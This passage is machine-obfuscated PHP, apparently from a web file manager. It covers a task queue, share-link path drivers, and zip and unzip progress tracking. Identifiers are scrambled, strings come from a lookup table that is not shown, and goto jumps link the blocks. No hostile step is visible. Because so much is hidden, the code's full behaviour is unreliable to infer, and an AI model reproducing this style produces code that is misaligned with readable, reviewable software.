$ªŞƒÑ¾²[343]) { return $áÊ™¦ÑĞ ? intval($áÊ™¦ÑĞ) : 0; } if ($°Ùà”˜ã == $ªŞƒÑ¾²[1813]) { return is_array($áÊ™¦ÑĞ) ? $áÊ™¦ÑĞ : array(); } return $áÊ™¦ÑĞ; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[ú‡®¯¨±][1813]); } public static function setAll($ìˆˆ•‡â) { $¦êŒÄÔ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($ìˆˆ•‡â), $¦êŒÄÔ); Cache::set(self::QUEUE_DATA, $ìˆˆ•‡â, $¦êŒÄÔ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($¹ò™Ş¹–, $•¼¿úÛ = 5.0) { if (!$¹ò™Ş¹–) { return; } $±÷¨Æª = Cache::get($¹ò™Ş¹–); if (!$±÷¨Æª || timeFloat() - floatVal($±÷¨Æª) >= $•¼¿úÛ) { Cache::set($¹ò™Ş¹–, timeFloat(), $•¼¿úÛ * 10); return !0; } return !1; } public static function timeLimitCall($Ò×öƒ½, $ü’™ÊÇï, $ÓãÁÜ·², $‘­Óö€Ş = 5.0) { $±ó îŠ¢ =& $_SERVER[ú‡®¯¨±]; if (!$Ò×öƒ½ || !$ü’™ÊÇï) { return; } self::$asyncAdd = !0; $ĞÉØ††š = $±ó îŠ¢[1814]; $¿œÖ‹ËÈ = Cache::get($ĞÉØ††š, !0); $ÂùÌâ–Ë = array($±ó îŠ¢[1815] => timeFloat(), $±ó îŠ¢[1816] => timeFloat(), $±ó îŠ¢[319] => $ü’™ÊÇï, $±ó îŠ¢[1806] => $ÓãÁÜ·², $±ó îŠ¢[196] => $‘­Óö€Ş); if (is_array($¿œÖ‹ËÈ[$Ò×öƒ½])) { $ÂùÌâ–Ë[$±ó îŠ¢[1816]] = $¿œÖ‹ËÈ[$Ò×öƒ½][$±ó îŠ¢[1816]]; } if (is_array($¿œÖ‹ËÈ[$Ò×öƒ½])) { if (timeFloat() - $¿œÖ‹ËÈ[$Ò×öƒ½][$±ó îŠ¢[1815]] < $ÂùÌâ–Ë[$±ó îŠ¢[196]] * 0.3) { return; } $ÂùÌâ–Ë[$±ó îŠ¢[1816]] = $¿œÖ‹ËÈ[$Ò×öƒ½][$±ó îŠ¢[1816]]; } $¿œÖ‹ËÈ[$Ò×öƒ½] = $ÂùÌâ–Ë; Cache::set($ĞÉØ††š, $¿œÖ‹ËÈ, 60); Cache::removeMemory($ĞÉØ††š); write_log($±ó îŠ¢[1817] . $Ò×öƒ½ . $±ó îŠ¢[73] . $ü’™ÊÇï, $±ó îŠ¢[187]); } public static function timeLimitCallLoop() { $Æ‰ÉÄÒ÷ =& $_SERVER[ú‡®¯¨±]; $â°¨°æŸ = array($Æ‰ÉÄÒ÷[1818]); $‘Ó³†°’ = in_array(strtolower(ACTION), $â°¨°æŸ); if (!$‘Ó³†°’ && !self::$asyncAdd) { return; } $¹¦ëüÏ = $Æ‰ÉÄÒ÷[1814]; $¶µ¶ò›Ó = Cache::get($¹¦ëüÏ, !0); if (!$¶µ¶ò›Ó || count($¶µ¶ò›Ó) <= 0) { return; } $ß €Ğş£ = !1; $®ÛÑ¸í = timeFloat(); $®½µìÖ = array(); foreach ($¶µ¶ò›Ó as $¸”Ù®Åø => $Ôû˜í·) { if ($®ÛÑ¸í - $Ôû˜í·[$Æ‰ÉÄÒ÷[1816]] > $Ôû˜í·[$Æ‰ÉÄÒ÷[196]]) { $ß €Ğş£ = !0; try { Hook::apply($Ôû˜í·[$Æ‰ÉÄÒ÷[319]], $Ôû˜í·[$Æ‰ÉÄÒ÷[1806]]); write_log($Æ‰ÉÄÒ÷[1819] . $¸”Ù®Åø . $Æ‰ÉÄÒ÷[73] . $Ôû˜í·[$Æ‰ÉÄÒ÷[319]] . $Æ‰ÉÄÒ÷[1820] . ACTION, $Æ‰ÉÄÒ÷[187]); } catch (Exception $»¶‚Ê•²) { } continue; } $®½µìÖ[$¸”Ù®Åø] = $Ôû˜í·; } if (!$ß €Ğş£) { return; } if (!$®½µìÖ) { return Cache::remove($¹¦ëüÏ); } Cache::set($¹¦ëüÏ, $®½µìÖ, 60); Cache::removeMemory($¹¦ëüÏ); } public static function finished($ïëùˆÍ, $î¬«á÷í) { $ ù¯ë†— =& $_SERVER[ú‡®¯¨±]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($ ù¯ë†—[319] => $ïëùˆÍ, $ ù¯ë†—[1806] => $î¬«á÷í); } private static function finishedRun() { $‹œ¹¼ä¯ =& $_SERVER[ú‡®¯¨±]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $¥²õŞòß) { try { Hook::apply($¥²õŞòß[$‹œ¹¼ä¯[319]], $¥²õŞòß[$‹œ¹¼ä¯[1806]]); } catch (Exception $òæĞ¦…¥) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto FàÂ·ù•â‰; d´ÎÍÍ‚™½: class PathDriverDbShareLink extends PathDriverDB { public function __construct($¨§ê—•Å) { $this->pathParse = $¨§ê—•Å; $this->model = Model($_SERVER[ú‡®¯¨±][1389]); } protected function infoParse($”­¿×˜, $ÕüÈÛÒ‡ = false, $˜şÓŠ¿ = false) { $ıİ¼’¼ =& $_SERVER[ú‡®¯¨±]; return Action($ıİ¼’¼[1230])->sharePathInfo($this->pathParse[$ıİ¼’¼[86]], !0, $ÕüÈÛÒ‡); } public function listPath($¡‡Öàñ¬, $úĞ¹ÛÊŞ = false) { $Æ¨¢½şó =& $_SERVER[ú‡®¯¨±]; $êœÛ¶¾ş = parent::listPath($¡‡Öàñ¬, $úĞ¹ÛÊŞ); if (!$êœÛ¶¾ş) { return $êœÛ¶¾ş; } if (is_array($êœÛ¶¾ş[$Æ¨¢½şó[1397]])) { $êœÛ¶¾ş[$Æ¨¢½şó[1397]] = Action($Æ¨¢½şó[1230])->shareItemInfo($êœÛ¶¾ş[$Æ¨¢½şó[1397]]); } foreach ($êœÛ¶¾ş as $›ÜÍÆ» => $‚Áªºˆã) { if (!in_array($›ÜÍÆ», array($Æ¨¢½şó[85], $Æ¨¢½şó[84]))) { continue; } foreach ($‚Áªºˆã as $µ±¡ÍÍÈ => $ÔÚ’šËı) { $êœÛ¶¾ş[$›ÜÍÆ»][$µ±¡ÍÍÈ] = Action($Æ¨¢½şó[1230])->shareItemInfo($ÔÚ’šËı); } } return $êœÛ¶¾ş; } public function listAll($¨ş«Ñ¯ß) { $²˜Ï¢— =& $_SERVER[ú‡®¯¨±]; $ì¼—Ó = IO::info($this->pathParse[$²˜Ï¢—[86]]); if (!$ì¼—Ó) { return array(); } $èÙ‹ü„ = $this->model->listAll($¨ş«Ñ¯ß); foreach ($èÙ‹ü„ as &$Ñ’£ã²) { $Ñ’£ã²[$²˜Ï¢—[89]] = Action($²˜Ï¢—[1230])->shareItemInfo($Ñ’£ã²[$²˜Ï¢—[89]]); } unset($Ñ’£ã²); return $èÙ‹ü„; } } class PathDriverDriverShareItem { public function __construct($Ú“áªÉœ) { $this->pathParse = $Ú“áªÉœ; } public function __call($²òºïºª, $øÁĞ‹ò¨) { $¢¡é«Û¢ =& $_SERVER[ú‡®¯¨±]; if (method_exists($this, $²òºïºª)) { return; } $¡øŒ†©¾ = call_user_func_array(array($¢¡é«Û¢[1398], $²òºïºª), $øÁĞ‹ò¨); $øÈü¸ø = array($¢¡é«Û¢[1399], $¢¡é«Û¢[1400], $¢¡é«Û¢[1401], $¢¡é«Û¢[1402], $¢¡é«Û¢[596], $¢¡é«Û¢[598], $¢¡é«Û¢[1403], $¢¡é«Û¢[109], $¢¡é«Û¢[1404], $¢¡é«Û¢[1405]); if (in_array($²òºïºª, $øÈü¸ø)) { $¡øŒ†©¾ = $this->getPathOuter($¡øŒ†©¾); } return $¡øŒ†©¾; } public function copy($ºªÂÜî, $ıŒ‡¢¨È, $¤±øËíÈ = false, $ï²´˜º = false) { return $this->copyMove($ºªÂÜî, $ıŒ‡¢¨È, $¤±øËíÈ, $_SERVER[ú‡®¯¨±][596], $ï²´˜º); } public function move($Õú›ãÆœ, $ñù‹ôàÇ, $÷è„‰ı = false, $ŞóŞË¬Á = false) { return $this->copyMove($Õú›ãÆœ, $ñù‹ôàÇ, $÷è„‰ı, $_SERVER[ú‡®¯¨±][598], $ŞóŞË¬Á); } private function copyMove($¿õõüÇ, $¥Áİ…©, $¸®éŞöº, $Ş¼µ¥ø, $¸ç®±şğ = false) { $Óóó´Ÿ =& $_SERVER[ú‡®¯¨±]; $Äú¶ü˜Á = $¥Áİ…©; $…ôìøÄ = IO::driverMake($¥Áİ…©); if ($…ôìøÄ->pathParse[$Óóó´Ÿ[1207]]) { $¥Áİ…© = $…ôìøÄ->pathParse[$Óóó´Ÿ[1207]]; } else { $¥Áİ…© = $Äú¶ü˜Á; } $”Œ­óÃê = IO::copyMove($¿õõüÇ, $¥Áİ…©, $¸®éŞöº, $Ş¼µ¥ø, $¸ç®±şğ); $”Œ­óÃê = $this->getPathOuter($”Œ­óÃê); return $”Œ­óÃê; } public function pathThis($Œ¥“ÉÓ“) { return get_path_this($this->pathParse[$_SERVER[ú‡®¯¨±][86]]); } public function pathFather($¸¯°©¹) { return get_path_father($this->pathParse[$_SERVER[ú‡®¯¨±][86]]); } public function iconvSystem($Ç‘º±úœ) { return $Ç‘º±úœ; } protected function infoParse($ä¶Å¤, $ÊÂ§“‘È = false) { $ìòıÊŞï =& $_SERVER[ú‡®¯¨±]; $Ü¢òë¤û = $this->pathParse[$ìòıÊŞï[539]][$ìòıÊŞï[1231]] . $this->pathParse[$ìòıÊŞï[1224]]; if ($ÊÂ§“‘È) { $ù€ƒç¢¹ = IO::infoWithChildren($Ü¢òë¤û); } else { $ù€ƒç¢¹ = IO::info($Ü¢òë¤û); } $ı‚‡—‘‘ = $this->pathParse[$ìòıÊŞï[539]]; return Action($ìòıÊŞï[1396])->_shareItemeParse($ù€ƒç¢¹, $ı‚‡—‘‘); } public function listAll($õàÁ¾Á½) { $©ìş‰•â =& $_SERVER[ú‡®¯¨±]; $ôàöàÔË = IO::listAll($õàÁ¾Á½); $š³û÷»û = rtrim($this->pathParse[$©ìş‰•â[539]][$©ìş‰•â[1231]], $©ìş‰•â[8]); foreach ($ôàöàÔË as &$ãø½ªó) { $ãø½ªó[$©ìş‰•â[86]] = $this->pathDriver . $©ìş‰•â[8] . ltrim(substr($ãø½ªó[$©ìş‰•â[86]], strlen($š³û÷»û)), $©ìş‰•â[8]); } unset($ãø½ªó); return $ôàöàÔË; } public function listAllSimple($Ü‚”š§, $±Ü¾´˜¯ = false) { $î¦ä€†‘ =& $_SERVER[ú‡®¯¨±]; $ıã€Ç¥ = $this->listAll($Ü‚”š§); $½çşù¯» = $this->pathParse[$î¦ä€†‘[473]]; if (trim($½çşù¯», $î¦ä€†‘[8]) == trim(get_path_father($½çşù¯»), $î¦ä€†‘[8])) { $±Ü¾´˜¯ = !0; } return IO::init($î¦ä€†‘[12])->listAllSimpleMake($ıã€Ç¥, $½çşù¯», $±Ü¾´˜¯); } public function getPathOuter($Á†«ş­) { $ó‹úàÛÊ =& $_SERVER[ú‡®¯¨±]; $‡ãğïÆ× = KodIO::parse($Á†«ş­); if ($‡ãğïÆ×[$ó‹úàÛÊ[33]] == KodIO::KOD_SHARE_ITEM) { return $‡ãğïÆ×[$ó‹úàÛÊ[86]]; } $ÎÈ€¹Šá = KodIO::clear($Á†«ş­); $Ñ¬Åí§ = KodIO::clear($this->pathParse[$ó‹úàÛÊ[539]][$ó‹úàÛÊ[1231]]); $•Ø€ı÷Ö = substr($ÎÈ€¹Šá, strlen($Ñ¬Åí§)); if (substr($ÎÈ€¹Šá, 0, strlen($Ñ¬Åí§)) != $Ñ¬Åí§) { return !1; } return $this->pathParse[$ó‹úàÛÊ[1225]] . $ó‹úàÛÊ[8] . ltrim($•Ø€ı÷Ö, $ó‹úàÛÊ[8]); } public function getType() { $¢œßææ =& $_SERVER[ú‡®¯¨±]; $€ô¢àÙ = str_replace($¢œßææ[76], $¢œßææ[12], get_class($this)); return strtolower($€ô¢àÙ); } public function isTypeObject($çëÆé‰“) { return IO::isTypeObject($çëÆé‰“); } public function info($½ƒîì“í) { return $this->infoParse($½ƒîì“í); } public function infoAuth($é©ÒÎİí) { return $this->infoParse($é©ÒÎİí); } public function infoWithChildren($†æ…íÈˆ) { return $this->infoParse($†æ…íÈˆ, !0); } public function infoFull($ÙúõóêË) { return $this->infoParse($ÙúõóêË); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($®ãˆÃÚ) { $this->pathParse = $®ãˆÃÚ; } protected function infoParse($úÏäÜ£, $‹òŒø¾€ = false) { $§‹ß¥™ =& $_SERVER[ú‡®¯¨±]; return Action($§‹ß¥™[1230])->sharePathInfo($this->pathParse[$§‹ß¥™[86]], !0, $‹òŒø¾€); } public function listPath($¤†ŠÌÚî, $¬ú¢ğ·Ë = false) { $ ÉŞäÎ =& $_SERVER[ú‡®¯¨±]; $¼²â€‘ = IO::listPath($¤†ŠÌÚî, $¬ú¢ğ·Ë); if (!$¼²â€‘) { return $¼²â€‘; } if (is_array($¼²â€‘[$ ÉŞäÎ[1397]])) { $‹Ü°¶ = Action($ ÉŞäÎ[1406])->parsePathChildren($¼²â€‘[$ ÉŞäÎ[1397]], array($ ÉŞäÎ[473] => $¤†ŠÌÚî)); $¼²â€‘[$ ÉŞäÎ[1397]] = Action($ ÉŞäÎ[1230])->shareItemInfo($‹Ü°¶); } foreach ($¼²â€‘ as $†³Œá‹İ => $şãÁ³†Ê) { if (!in_array($†³Œá‹İ, array($ ÉŞäÎ[85], $ ÉŞäÎ[84]))) { continue; } foreach ($şãÁ³†Ê as $›Éè½Õ => $‹Ü°¶) { $‹Ü°¶ = Action($ ÉŞäÎ[1406])->parsePathChildren($‹Ü°¶, array($ ÉŞäÎ[473] => $¤†ŠÌÚî)); $¼²â€‘[$†³Œá‹İ][$›Éè½Õ] = Action($ ÉŞäÎ[1230])->shareItemInfo($‹Ü°¶); } } return $¼²â€‘; } } goto aĞ´Ê¾Œæ; FàÂ·ù•â‰: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $­À¾‹É =& $_SERVER[ú‡®¯¨±]; parent::startAfter(); Hook::bind($­À¾‹É[1821], array($this, $­À¾‹É[1822])); Hook::bind($­À¾‹É[1249], array($this, $­À¾‹É[1823])); Hook::bind($­À¾‹É[1824], array($this, $­À¾‹É[1825])); $ø¬ú‹´Á =& $this->task; $ø¬ú‹´Á[$­À¾‹É[1826]] = $­À¾‹É[1250]; if (!$ø¬ú‹´Á[$­À¾‹É[1598]]) { $ø¬ú‹´Á[$­À¾‹É[1598]] = LNG($­À¾‹É[1827]); } } protected function endAfter() { $·Ë¬£Í¾ =& $_SERVER[ú‡®¯¨±]; parent::endAfter(); Hook::unbind($·Ë¬£Í¾[1821], array($this, $·Ë¬£Í¾[1822])); Hook::unbind($·Ë¬£Í¾[1249], array($this, $·Ë¬£Í¾[1823])); Hook::unbind($·Ë¬£Í¾[1824], array($this, $·Ë¬£Í¾[1825])); } public function updateAfter() { $Åóë¶¶ =& $_SERVER[ú‡®¯¨±]; $¤ÂÁäÀ =& $this->task; if (!$¤ÂÁäÀ[$Åóë¶¶[841]] || !$¤ÂÁäÀ[$Åóë¶¶[818]]) { if ($¤ÂÁäÀ[$Åóë¶¶[1826]] != $Åóë¶¶[368]) { return; } } if ($¤ÂÁäÀ[$Åóë¶¶[1826]] == $Åóë¶¶[1250]) { $—áó§ôÛ = 0; if ($¤ÂÁäÀ[$Åóë¶¶[1761]]) { $—áó§ôÛ = $¤ÂÁäÀ[$Åóë¶¶[1762]] / $¤ÂÁäÀ[$Åóë¶¶[1761]]; } $¤ÂÁäÀ[$Åóë¶¶[1710]] = $—áó§ôÛ * 0.3; } else { if ($¤ÂÁäÀ[$Åóë¶¶[1826]] == $Åóë¶¶[368]) { $—áó§ôÛ = $¤ÂÁäÀ[$Åóë¶¶[1709]] / $¤ÂÁäÀ[$Åóë¶¶[841]]; $¤ÂÁäÀ[$Åóë¶¶[1710]] = 0.3 + $—áó§ôÛ * 0.4; } else { if ($¤ÂÁäÀ[$Åóë¶¶[1826]] == $Åóë¶¶[109]) { $è×©ÕŞ† = 0; if ($¤ÂÁäÀ[$Åóë¶¶[1763]] == $Åóë¶¶[109]) { $è×©ÕŞ† = $¤ÂÁäÀ[$Åóë¶¶[1762]]; } $—áó§ôÛ = ($¤ÂÁäÀ[$Åóë¶¶[1766]] + $è×©ÕŞ†) / $¤ÂÁäÀ[$Åóë¶¶[818]]; $¤ÂÁäÀ[$Åóë¶¶[1710]] = 0.3 + 0.4 + $—áó§ôÛ * 0.3; } } } if ($¤ÂÁäÀ[$Åóë¶¶[1710]] > 0) { $»Ş†¢“­ = timeFloat() - $¤ÂÁäÀ[$Åóë¶¶[1712]] - $¤ÂÁäÀ[$Åóë¶¶[1715]]; $¤ÂÁäÀ[$Åóë¶¶[1716]] = $»Ş†¢“­ * (1 - $¤ÂÁäÀ[$Åóë¶¶[1710]]) / $¤ÂÁäÀ[$Åóë¶¶[1710]]; } } public function addFile($—íÑô×) { $•Ø«»Û¸ =& $_SERVER[ú‡®¯¨±]; $äáäõÀâ =& $this->task; $ÚË©†ã = IO::info($—íÑô×); $äáäõÀâ[$•Ø«»Û¸[1759]] = $ÚË©†ã[$•Ø«»Û¸[32]]; $äáäõÀâ[$•Ø«»Û¸[1761]] = $ÚË©†ã[$•Ø«»Û¸[78]]; $äáäõÀâ[$•Ø«»Û¸[1762]] = 0; $äáäõÀâ[$•Ø«»Û¸[1120]] = $•Ø«»Û¸[1782]; $äáäõÀâ[$•Ø«»Û¸[1763]] = $•Ø«»Û¸[1250]; $äáäõÀâ[$•Ø«»Û¸[818]] = $ÚË©†ã[$•Ø«»Û¸[78]]; $äáäõÀâ[$•Ø«»Û¸[841]] = 1; $èÙ‹×ç = 0; $äáäõÀâ[$•Ø«»Û¸[1770]] = array($•Ø«»Û¸[1771] => $èÙ‹×ç + 1, $•Ø«»Û¸[472] => $ÚË©†ã[$•Ø«»Û¸[32]], $•Ø«»Û¸[86] => $ÚË©†ã[$•Ø«»Û¸[86]], $•Ø«»Û¸[561] => $ÚË©†ã[$•Ø«»Û¸[561]] ? $ÚË©†ã[$•Ø«»Û¸[561]] : $ÚË©†ã[$•Ø«»Û¸[86]]); $this->update(); } public function zipEvent($‰»×À€É, $Ä¿»Æ©Ù, $ü¿îï¯½, $ÄíÈ“—Ò) { $å†ì›à =& $_SERVER[ú‡®¯¨±]; $¸èì¹ê« =& $this->task; $¸èì¹ê«[$å†ì›à[1759]] = get_path_this($Ä¿»Æ©Ù); $¸èì¹ê«[$å†ì›à[1761]] = $ÄíÈ“—Ò; $¸èì¹ê«[$å†ì›à[1762]] = $ü¿îï¯½; $¸èì¹ê«[$å†ì›à[1120]] = $‰»×À€É == $å†ì›à[1828] ? $å†ì›à[1829] : $å†ì›à[1830]; $¸èì¹ê«[$å†ì›à[1763]] = $å†ì›à[12]; $¸èì¹ê«[$å†ì›à[818]] = $ÄíÈ“—Ò; $¸èì¹ê«[$å†ì›à[1826]] = $å†ì›à[368]; $this->update(); } public function unzipAfter($À¶Ëœıê) { $½ê¦­‹ =& $_SERVER[ú‡®¯¨±]; $ğ³À»„Ï =& $this->task; $ğ³À»„Ï[$½ê¦­‹[1826]] = $½ê¦­‹[109]; $®öıû™ = IO::infoWithChildren($À¶Ëœıê); $Ù†À¼Ùİ = 0; $ğ³À»„Ï[$½ê¦­‹[1770]] = array($½ê¦­‹[1771] => $Ù†À¼Ùİ + 1, $½ê¦­‹[472] => $®öıû™[$½ê¦­‹[32]], $½ê¦­‹[86] => $®öıû™[$½ê¦­‹[86]], $½ê¦­‹[561] => $®öıû™[$½ê¦­‹[561]] ? $®öıû™[$½ê¦­‹[561]] : $®öıû™[$½ê¦­‹[86]]); if ($®öıû™[$½ê¦­‹[33]] == $½ê¦­‹[226]) { $ğ³À»„Ï[$½ê¦­‹[841]] = 1; } else { $ğ³À»„Ï[$½ê¦­‹[841]] = $®öıû™[$½ê¦­‹[81]][$½ê¦­‹[79]]; } $ğ³À»„Ï[$½ê¦­‹[1120]] = $½ê¦­‹[12]; $ğ³À»„Ï[$½ê¦­‹[1763]] = 0; $ğ³À»„Ï[$½ê¦­‹[1709]] = 0; $ğ³À»„Ï[$½ê¦­‹[1761]] = 0; $ğ³À»„Ï[$½ê¦­‹[1762]] = 0; $ğ³À»„Ï[$½ê¦­‹[1759]] = $½ê¦­‹[12]; $ğ³À»„Ï[$½ê¦­‹[1766]] = 0; $ğ³À»„Ï[$½ê¦­‹[818]] = $®öıû™[$½ê¦­‹[78]]; $this->update(); self::log($½ê¦­‹[1831] . json_encode(array($ğ³À»„Ï, $®öıû™))); } public function nameParse($òÃÜšîÖ) { $Ñ’÷ïË =& $_SERVER[ú‡®¯¨±]; $º¥­ô¥ü =& $this->task; if ($º¥­ô¥ü[$Ñ’÷ïË[1826]] == $Ñ’÷ïË[1250]) { $º¥­ô¥ü[$Ñ’÷ïË[1826]] = $Ñ’÷ïË[368]; $º¥­ô¥ü[$Ñ’÷ïË[1766]] = 0; $º¥­ô¥ü[$Ñ’÷ïË[818]] = 0; } $Èµ­¹¥Å = get_path_this($òÃÜšîÖ); if (strstr($Èµ­¹¥Å, $Ñ’÷ïË[10])) { $º¥­ô¥ü[$Ñ’÷ïË[1709]] += 1; $º¥­ô¥ü[$Ñ’÷ïË[841]] += 1; } $º¥­ô¥ü[$Ñ’÷ïË[1759]] = $òÃÜšîÖ; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $øÙ×—Ô =& $_SERVER[ú‡®¯¨±]; parent::startAfter(); Hook::bind($øÙ×—Ô[1832], array($this, $øÙ×—Ô[1822])); Hook::bind($øÙ×—Ô[1824], array($this, $øÙ×—Ô[1825])); $ğ¹ÓÛÉÇ =& $this->task; $ğ¹ÓÛÉÇ[$øÙ×—Ô[1826]] = $øÙ×—Ô[1250]; if (!$ğ¹ÓÛÉÇ[$øÙ×—Ô[1598]]) { $ğ¹ÓÛÉÇ[$øÙ×—Ô[1598]] = LNG($øÙ×—Ô[1833]); } } protected function endAfter() { $¯”™öÆ =& $_SERVER[ú‡®¯¨±]; parent::endAfter(); Hook::unbind($¯”™öÆ[1832], array($this, $¯”™öÆ[1822])); Hook::unbind($¯”™öÆ[1824], array($this, $¯”™öÆ[1825])); } public function updateAfter() { $„Âúã¾€ =& $_SERVER[ú‡®¯¨±]; $£Î¿Ã³Î =& $this->task; if (!$£Î¿Ã³Î[$„Âúã¾€[841]] || !$£Î¿Ã³Î[$„Âúã¾€[818]]) { return; } if ($£Î¿Ã³Î[$„Âúã¾€[1826]] == $„Âúã¾€[1250]) { $‹­¦¡š = $£Î¿Ã³Î[$„Âúã¾€[1762]]; if ($£Î¿Ã³Î[$„Âúã¾€[1763]] != $„Âúã¾€[1250]) { $‹­¦¡š = 0; } $¯«şˆà¢ = ($£Î¿Ã³Î[$„Âúã¾€[1766]] + $‹­¦¡š) / $£Î¿Ã³Î[$„Âúã¾€[818]]; $£Î¿Ã³Î[$„Âúã¾€[1710]] = $¯«şˆà¢ * 0.3; } else { if ($£Î¿Ã³Î[$„Âúã¾€[1826]] == $„Âúã¾€[368]) { $¯«şˆà¢ = $£Î¿Ã³Î[$„Âúã¾€[1709]] / $£Î¿Ã³Î[$„Âúã¾€[841]]; $£Î¿Ã³Î[$„Âúã¾€[1710]] = 0.3 + $¯«şˆà¢ * 0.5; } else { if ($£Î¿Ã³Î[$„Âúã¾€[1826]] == $„Âúã¾€[109]) { $¯«şˆà¢ = 0; if ($£Î¿Ã³Î[$„Âúã¾€[1761]]) { $¯«şˆà¢ = $£Î¿Ã³Î[$„Âúã¾€[1762]] / $£Î¿Ã³Î[$„Âúã¾€[1761]]; } $£Î¿Ã³Î[$„Âúã¾€[1710]] = 0.3 + 0.5 + $¯«şˆà¢ * 0.2; } } } if ($£Î¿Ã³Î[$„Âúã¾€[1710]] > 0) { $‰‡Âä×§ = timeFloat() - $£Î¿Ã³Î[$„Âúã¾€[1712]] - $£Î¿Ã³Î[$„Âúã¾€[1715]]; $£Î¿Ã³Î[$„Âúã¾€[1716]] = $‰‡Âä×§ * (1 - $£Î¿Ã³Î[$„Âúã¾€[1710]]) / $£Î¿Ã³Î[$„Âúã¾€[1710]]; } } public function copyFileStart($½¢šùÇ, $½û¬şÃ©, $õË®ù, $ñ­áÓ—, $ãÌ‡ş¦à, $ÊÎÜ Ã“) { $ÔíÒğ² =& $_SERVER[ú‡®¯¨±]; parent::copyFileStart($½¢šùÇ, $½û¬şÃ©, $õË®ù, $ñ­áÓ—, $ãÌ‡ş¦à, $ÊÎÜ Ã“); $øÕŸà’Î =& $this->task; if ($øÕŸà’Î[$ÔíÒğ²[1826]] == $ÔíÒğ²[368]) { $øÕŸà’Î[$ÔíÒğ²[1826]] = $ÔíÒğ²[109]; } $this->update(); } public function copyFileEnd($‡€¥âŸá, $©•êêÏÔ, $æø“±à÷, $õ¦Äıüí, $²£¶úãÑ, $¡šßÁ«) { $¡ú¨ïéå =& $_SERVER[ú‡®¯¨±]; $çå‹ä€ä =& $this->task; $çå‹ä€ä[$¡ú¨ïéå[1762]] = $çå‹ä€ä[$¡ú¨ïéå[1761]]; $çå‹ä€ä[$¡ú¨ïéå[1766]] += $çå‹ä€ä[$¡ú¨ïéå[1761]]; $çå‹ä€ä[$¡ú¨ïéå[1763]] = $¡ú¨ïéå[12]; $this->update(); } public function zipEvent($“€Óìñí, $ª÷—ÏÅí, $“¥şïÙó, $”ÉĞ­Ó) { $¥®Çİë =& $_SERVER[ú‡®¯¨±]; $…óõ„çÎ =& $this->task; $…óõ„çÎ[$¥®Çİë[1759]] = get_path_this($ª÷—ÏÅí); $…óõ„çÎ[$¥®Çİë[1761]] = $”ÉĞ­Ó; $…óõ„çÎ[$¥®Çİë[1762]] = $“¥şïÙó; $…óõ„çÎ[$¥®Çİë[1120]] = $“€Óìñí == $¥®Çİë[1834] ? $¥®Çİë[1829] : $¥®Çİë[1830]; $…óõ„çÎ[$¥®Çİë[1763]] = $¥®Çİë[12]; $…óõ„çÎ[$¥®Çİë[818]] = $”ÉĞ­Ó; $…óõ„çÎ[$¥®Çİë[1826]] = $¥®Çİë[368]; $this->update(); } public function nameParse($Š¾¯òªÖ) { $¨¥Œø– =& $_SERVER[ú‡®¯¨±]; $ëş³šåˆ =& $this->task; if ($ëş³šåˆ[$¨¥Œø–[1709]] < $ëş³šåˆ[$¨¥Œø–[841]]) { $öŸÛ±ı² = get_path_this($Š¾¯òªÖ); if (strstr($öŸÛ±ı², $¨¥Œø–[10])) { $ëş³šåˆ[$¨¥Œø–[1709]] += 1; } } if ($ëş³šåˆ[$¨¥Œø–[1826]] == $¨¥Œø–[1250]) { $ëş³šåˆ[$¨¥Œø–[1826]] = $¨¥Œø–[368]; } $ëş³šåˆ[$¨¥Œø–[1759]] = $Š¾¯òªÖ; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($›Û»¦¨Ğ) { $À‰¶ªˆ =& $_SERVER[ú‡®¯¨±]; $œüá°¬ = array($À‰¶ªˆ[640] => array($À‰¶ªˆ[33] => $À‰¶ªˆ[1835], $À‰¶ªˆ[328] => array($À‰¶ªˆ[251], $À‰¶ªˆ[820], $À‰¶ªˆ[1836], $À‰¶ªˆ[1837])), $À‰¶ªˆ[1838] => array($À‰¶ªˆ[33] => $À‰¶ªˆ[1839], $À‰¶ªˆ[328] => array($À‰¶ªˆ[251], $À‰¶ªˆ[818], $À‰¶ªˆ[1840], $À‰¶ªˆ[1841], $À‰¶ªˆ[1842]))); if (!isset($œüá°¬[$›Û»¦¨Ğ])) { return !1; } $this->optionType = $œüá°¬[$›Û»¦¨Ğ][$À‰¶ªˆ[33]]; $this->field = $œüá°¬[$›Û»¦¨Ğ][$À‰¶ªˆ[328]]; return !0; } public function listData($˜ÒÓëÙ = false, $£€üöí = "\x6d\157\144\x69\x66\x79\x54\151\x6d\x65", $À›‚†•ë = false) { return parent::listData($˜ÒÓëÙ, $£€üöí, $À›‚†•ë); } public function trendList($«ş”É—¢) { $ğ•î Ç =& $_SERVER[ú‡®¯¨±]; $€°Òàµš = $this->listData(); if ($€°Òàµš) { $°‹À¥üÛ = end($€°Òàµš); $©ÈÕëÒº = date($ğ•î Ç[1843], strtotime($ğ•î Ç[1844])); if ($°‹À¥üÛ[$ğ•î Ç[251]] == $©ÈÕëÒº) { return $€°Òàµš; } $ö¡¿Ë = strtotime($°‹À¥üÛ[$ğ•î Ç[251]]); } if (!isset($ö¡¿Ë)) { $˜Ö×œ¹ = $«ş”É—¢ == $ğ•î Ç[640] ? $ğ•î Ç[577] : $ğ•î Ç[880]; $ö¡¿Ë = Model($˜Ö×œ¹)->min($ğ•î Ç[227]); } $âàÓ›® = $ğ•î Ç[1845] . ucfirst($«ş”É—¢); $ù¬Ì»Øõ = $this->dateList($ö¡¿Ë); foreach ($ù¬Ì»Øõ as $©ÈÕëÒº) { $this->{$âàÓ›®}($©ÈÕëÒº); } return $this->listData(); } private function dateList($ä›¹ÈÉ) { $ÎåÙ ›Ò =& $_SERVER[ú‡®¯¨±]; $Ù…ÒÛå¤ = $ä›¹ÈÉ; 